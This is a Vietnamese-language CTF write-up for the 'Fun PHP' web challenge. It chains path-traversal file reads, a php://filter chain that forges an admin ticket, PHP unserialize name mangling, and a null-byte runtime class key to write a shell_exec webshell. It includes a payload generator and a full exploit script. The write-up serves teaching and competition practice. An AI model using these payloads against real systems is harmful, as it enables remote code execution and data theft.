## web/Fun PHP
### Challenge Description

PHP is tricky bro, recently I've read a trick about it and want to share with you. But isn't it would be more fun if you can find the trick by yourself?

### Initial Analysis

Khi truy cập website, user bình thường có thể xem dashboard và reports. Tuy nhiên một số chức năng liên quan đến `operator/admin` bị khóa.

Trong dashboard có phần:
```
Operations Access
Import operator approval reference
Publish Export Manifest
```
Nếu chưa có quyền operator, website hiển thị:

`Publisher Locked`

Điều này cho thấy muốn ghi export hoặc dùng các chức năng nhạy cảm thì cần bật `admin/operator` session trước.

Một endpoint đáng chú ý là:

`/reports/download?file=`

Thử path traversal:

`curl -s "$URL/reports/download?file=../../../../etc/passwd"`

Server trả nội dung file, chứng tỏ endpoint này có **LFI / arbitrary** file read.

Nhờ **LFI**, ta có thể đọc source code của ứng dụng.

### Source Code Recon

Một số file quan trọng được leak qua LFI:
```
curl -s "$URL/reports/download?file=../../html/index.php"
curl -s "$URL/reports/download?file=../../app/insight/service/presetimportservice.php"
curl -s "$URL/reports/download?file=../../app/insight/service/reportactiondispatcher.php"
curl -s "$URL/reports/download?file=../../app/insight/module/enterprisereports.php"
curl -s "$URL/reports/download?file=../../app/insight/support/featureflags.php"
```
Trong `html/index.php`, app register các route chính:
```
$router->add('POST', '/dashboard/integrations/import-reference', [$dashboardController, 'importReference']);
$router->add('POST', '/dashboard/operations/publish-manifest', [$dashboardController, 'publishSnapshot']);
$router->add('POST', '/reports/import-preset', [$reportController, 'importPreset']);
$router->add('GET', '/reports/download', [$reportController, 'download']);
```
Có 2 endpoint quan trọng:
```
/dashboard/integrations/import-reference
/reports/import-preset
```
**Part 1: Getting Admin Session**

Trong DashboardController, chức năng import reference dùng để bật `admin/operator` session.

Nếu reference hợp lệ, server set:

`$_SESSION['insightboard_admin'] = true;`

Sau khi có session này, dashboard sẽ hiển thị:
```
Operator workspace is active
Publish Export Manifest
```
Vấn đề là ta cần biết operator approval reference.

Trong quá trình đọc file, ta xác định ticket cần match là:

`2026ctfhcmus`

Tuy nhiên app không cho đọc trực tiếp ticket theo cách bình thường. Vì vậy ta dùng `php://filter` với kỹ thuật wrapwrap để tạo một filter chain sao cho:

`file_get_contents($chain) === "2026ctfhcmus"`

Ticket này dài đúng 12 bytes.

Test local:
```
cd ~/Downloads/FunPHP/wrapwrap

printf 'AAAAAAAAAAAA' > twelve.txt

python3 wrapwrap.py 'twelve.txt' '2026ctfhcmus' '' 12

export CHAIN="$(cat chain.txt)"

php -r '$c=getenv("CHAIN"); $x=@file_get_contents($c); var_dump(strlen($x), bin2hex($x), $x);'
```
Kết quả:
```
int(12)
string(24) "3230323663746668636d7573"
string(12) "2026ctfhcmus"
```
Sau đó dùng chain này để bật admin session.
```
URL='http://chall.blackpinker.com:20750'
COOKIE="$HOME/Downloads/FunPHP/wrapwrap/cookie_20750.txt"

rm -f "$COOKIE"

CHAIN="$(cat ~/Downloads/FunPHP/wrapwrap/chain_remote.txt)"

curl -s -i "$URL/dashboard/integrations/import-reference" \
  -b "$COOKIE" -c "$COOKIE" \
  --data-urlencode "ticket_ref=$CHAIN" >/dev/null
```
Ở đây:
```
-b "$COOKIE" dùng cookie hiện tại nếu có
-c "$COOKIE" lưu cookie mới server set
```
Kiểm tra cookie đã có quyền operator chưa:
```
curl -s "$URL/dashboard" -b "$COOKIE" \
  | grep -oE 'Operator workspace is active|Publish Export Manifest|Publisher Locked|Import reference [^<]+'
```
Nếu thành công:
```
Operator workspace is active
Publish Export Manifest
```
Đây là bước rất quan trọng, vì sink cuối cùng có check admin session.

**Part 2: Unsafe Preset Import**

Endpoint:
`
POST /reports/import-preset
`
nhận một tham số:

`preset=`

Trong `PresetImportService`, app decode base64url rồi unserialize:
```
$raw = $this->decodeBase64Url($preset);
$this->validateEnvelope($raw);
$unserialized = @unserialize($raw);

if (!$unserialized instanceof DashboardPreset) {
    throw new RuntimeException('Preset is not a dashboard preset');
}
```
Object cần là `DashboardPreset`:
```
final class DashboardPreset
{
    public string $name;
    public string $layout;
    public array $blocks;

    public function getBlocks(): array
    {
        return $this->blocks;
    }
}
```
Mỗi block là `ReportBlock`:
```
final class ReportBlock
{
    public string $title;
    public string $class;
    public string $method;
    public array $args;
}
```
Sau khi import preset, app render preview và dispatch từng block.

Trong `DashboardPreviewService`:
```
foreach ($preset->getBlocks() as $block) {
    $result = $this->dispatcher->dispatch($block);
}
```
Trong `ReportActionDispatcher`:
```
$rawClass = $context['class'];
$method = $context['method'];

$this->assertNamespace($rawClass);
$this->assertPayload($block->args);

$result = (string)$rawClass::$method($block->args);
```
Nghĩa là nếu điều khiển được:
```
ReportBlock::$class
ReportBlock::$method
ReportBlock::$args
```
thì ta có thể gọi static method tùy ý trong allowlist namespace.

Namespace allowlist:
```
private array $namespaces = [
    'app\\insight\\action\\',
    'app\\insight\\module\\',
];
```
Check namespace:
```
$forCheck = strtolower(ltrim($rawClass, "\\\\\0 \t\n\r"));

foreach ($this->namespaces as $namespace) {
    if (str_starts_with($forCheck, $namespace)) {
        return;
    }
}
```
Điểm đáng chú ý là `ltrim()` loại bỏ cả null byte `\0`.

**Part 3: PHP Serialize Name Mangling**

PHP serialized object cho phép property name chứa null byte. Private property được encode theo dạng:

`\0ClassName\0property`

Do đó ta có thể craft serialized object có property name dạng:
```
"\0App\Insight\Model\ReportBlock\0class"
"\0App\Insight\Model\ReportBlock\0method"
"\0App\Insight\Model\ReportBlock\0args"
```
Trong quá trình test, ta xác nhận name-mangling này có thể overwrite các typed public property của ReportBlock.

Ví dụ test `args`:
```
public args  = period: PUBLIC
mangled args = period: MANGLED
```
Khi render, server trả:

`Revenue chart ready for period: MANGLED`

Điều này chứng minh ta điều khiển được class, method, args trong dispatcher.

**Part 4: Finding the Sink**

Trong `enterprisereports.php`, có một class cực kỳ quan trọng:
```
if (FeatureFlags::enabled('enterprise_snapshots')) {
    final class SnapshotPublisher
    {
        public static function publishSnapshot(array $args = []): string
        {
            if (!self::adminSessionActive()) {
                return 'web export publisher locked';
            }

            $name = (string)($args['name'] ?? '');
            $body = (string)($args['body'] ?? '');

            if (!preg_match('/^[A-Za-z0-9][A-Za-z0-9._-]{0,60}\.php$/', $name)) {
                return 'invalid web export name';
            }

            if (!str_starts_with($body, '<?php') || strlen($body) > 4096) {
                return 'invalid web export body';
            }

            $path = '/var/www/html/' . $name;

            if (!PathGuard::inDocumentRoot($path)) {
                return 'web export destination rejected';
            }

            file_put_contents($path, $body);
            return 'web export published';
        }

        public static function describeSnapshot(array $args = []): string
        {
            return 'web export publisher unavailable';
        }

        private static function adminSessionActive(): bool
        {
            if (session_status() !== PHP_SESSION_ACTIVE) {
                session_start();
            }

            return ($_SESSION['insightboard_admin'] ?? false) === true;
        }
    }
}
```
Nếu gọi được:
```
SnapshotPublisher::publishSnapshot([
    'name' => 'x.php',
    'body' => '<?php echo shell_exec($_GET["c"] ?? "/readflag"); ?>'
])
```
thì app sẽ ghi webshell vào:

``/var/www/html/x.php`

Sau đó có thể chạy:

`curl "$URL/x.php?c=/readflag"`

Tuy nhiên class này bị đặt trong feature flag:

`if (FeatureFlags::enabled('enterprise_snapshots')) {`

Trong `featureflags.php`:
```
final class FeatureFlags
{
    private static array $flags = [
        ...
        'enterprise_snapshots' => false,
    ];

    public static function enabled(string $flag): bool
    {
        return self::$flags[$flag] ?? false;
    }
}
```
Gọi class bình thường sẽ lỗi:

`Class "App\Insight\Module\SnapshotPublisher" not found`

Lúc tôi nghĩ cần bật `FeatureFlags`, nhưng source không có chỗ nào cho phép đổi flag.

**Part 5: The Real Trick - Conditional Class Runtime Definition Key**

Đây là trick chính của bài.

Trong PHP, khi một class được khai báo trong conditional block như:
```
if (false) {
    class Debug {}
}
```
class không được declare theo tên bình thường. Tuy nhiên PHP vẫn tạo một **runtime definition key** nội bộ cho conditional class.

Trong PHP 8.4, hàm `zend_build_runtime_definition_key()` build key theo format:

`"\0" + name + filename + ":" + start_lineno + "$" + counter_hex`

Trong source PHP 8.4, key này được build bằng `zend_strpprintf()` với `'\0'`, class name, filename, line number và `CG(rtd_key_counter)++;` counter được format bằng hex `(PRIx32)`.

class cần gọi là:

`App\Insight\Module\SnapshotPublisher`

Nó nằm trong:

`/var/www/app/insight/module/enterprisereports.php`

Class bắt đầu ở line:

`114`

Ta brute local và tìm được key chính xác:

`\x00app\insight\module\snapshotpublisher/var/www/app/insight/module/enterprisereports.php:114$d`

Local confirm:
```
[CALL HIT]
name=app\insight\module\snapshotpublisher
line=114
ctr=d
result=web export publisher unavailable
```
Giải thích từng phần của key:

`\x00`

Null byte prefix do PHP runtime definition key tạo ra.

`app\insight\module\snapshotpublisher`

Tên class lowercase.

`/var/www/app/insight/module/enterprisereports.php`

File chứa conditional class.

`:114`

Line khai báo class.

`$d`

Runtime definition counter ở dạng hex. Ở đây counter là `d`.

Vì sao key này qua được namespace check?

Class string bắt đầu bằng null byte:

`\x00app\insight\module\snapshotpublisher...`

Dispatcher check bằng:

`$forCheck = strtolower(ltrim($rawClass, "\\\\\0 \t\n\r"));`

Do đó sau `ltrim()`, string trở thành:

`app\insight\module\snapshotpublisher...`

và pass allowlist:

`app\insight\module\`

Nhưng khi PHP thực hiện static call:

`$rawClass::$method($args)`

nó vẫn dùng full runtime key có null byte, nên gọi được conditional class.

### Exploit Payload

Payload cuối là một serialized DashboardPreset chứa một ReportBlock:
```
class  = "\0app\insight\module\snapshotpublisher/var/www/app/insight/module/enterprisereports.php:114$d"
method = "publishSnapshot"
args   = {
    "name": "x.php",
    "body": "<?php echo shell_exec($_GET[\"c\"] ?? \"/readflag\"); ?>"
}
```
`publishSnapshot()` sẽ ghi file:

`/var/www/html/x.php`

với nội dung webshell:

`<?php echo shell_exec($_GET["c"] ?? "/readflag"); ?>`
**Payload Generator**

File `gen_runtime_key_rce_final.php`:
```
<?php
function b64u($s) {
    return rtrim(strtr(base64_encode($s), '+/', '-_'), '=');
}

function s($x) {
    return 's:' . strlen($x) . ':"' . $x . '";';
}

function arr_assoc($d) {
    $out = 'a:' . count($d) . ':{';

    foreach ($d as $k => $v) {
        $out .= s($k) . s($v);
    }

    return $out . '}';
}

$dp = 'App\\Insight\\Model\\DashboardPreset';
$rb = 'App\\Insight\\Model\\ReportBlock';

$key = "\0app\\insight\\module\\snapshotpublisher/var/www/app/insight/module/enterprisereports.php:114" . '$d';

$args = [
    'name' => 'x.php',
    'body' => '<?php echo shell_exec($_GET["c"] ?? "/readflag"); ?>',
];

$block =
    'O:' . strlen($rb) . ':"' . $rb . '":4:{'
  . s('title') . s('rce')
  . s('class') . s($key)
  . s('method') . s('publishSnapshot')
  . s('args') . arr_assoc($args)
  . '}';

$preset =
    'O:' . strlen($dp) . ':"' . $dp . '":3:{'
  . s('name') . s('x')
  . s('layout') . s('grid')
  . s('blocks') . 'a:1:{i:0;' . $block . '}'
  . '}';

fwrite(STDERR, "key_hex=" . bin2hex($key) . "\n");

echo b64u($preset), PHP_EOL;
```
Lưu ý quan trọng:

`$key = "...:114" . '$d';`

Không được viết:

`$key = "...:114$d";`

vì PHP sẽ hiểu $d là biến và làm sai key.

**Full Exploit Script**

File `solve.sh`:
```
#!/usr/bin/env bash
set -euo pipefail

URL='http://chall.blackpinker.com:20485'
COOKIE="$HOME/Downloads/FunPHP/wrapwrap/cookie_20485.txt"
CHAIN_FILE="$HOME/Downloads/FunPHP/wrapwrap/chain_remote.txt"

echo '[*] Clean old cookie'
rm -f "$COOKIE"

echo '[*] Load wrapwrap chain'
CHAIN="$(cat "$CHAIN_FILE")"

echo '[*] Enable admin session'
curl -s -i "$URL/dashboard/integrations/import-reference" \
  -b "$COOKIE" -c "$COOKIE" \
  --data-urlencode "ticket_ref=$CHAIN" >/dev/null

echo '[*] Check admin'
ADMIN_CHECK="$(curl -s "$URL/dashboard" -b "$COOKIE")"

echo "$ADMIN_CHECK" \
  | grep -oE 'Operator workspace is active|Publish Export Manifest|Publisher Locked|Import reference [^<]+' || true

if ! echo "$ADMIN_CHECK" | grep -q 'Operator workspace is active'; then
  echo '[-] Admin session not enabled'
  exit 1
fi

echo '[+] Admin session enabled'

echo '[*] Generate runtime-definition-key RCE payload'
PAYLOAD="$(php gen_runtime_key_rce_final.php)"

echo '[*] Send payload'
curl -s -X POST "$URL/reports/import-preset" \
  -b "$COOKIE" \
  --data-urlencode "preset=$PAYLOAD" \
  | sed 's/&quot;/"/g' \
  | grep -oE 'web export published|web export publisher locked|invalid web export[^<]+|Class "[^"]+" not found|Action outside[^<]+|Preset imported successfully' || true

echo '[*] Test webshell'
curl -s "$URL/x.php?c=id"
echo

echo '[*] Read flag'
curl -s "$URL/x.php?c=/readflag"
echo
```
![Running the Exploit](https://lh3.googleusercontent.com/u/0/d/1v6JR-LiupvEqRTaZ7zY2FpJzlbwUP0Ww)
Flag: `HCMUS-CTF{h4v3_fUN_wi7H_PHP_blabla}`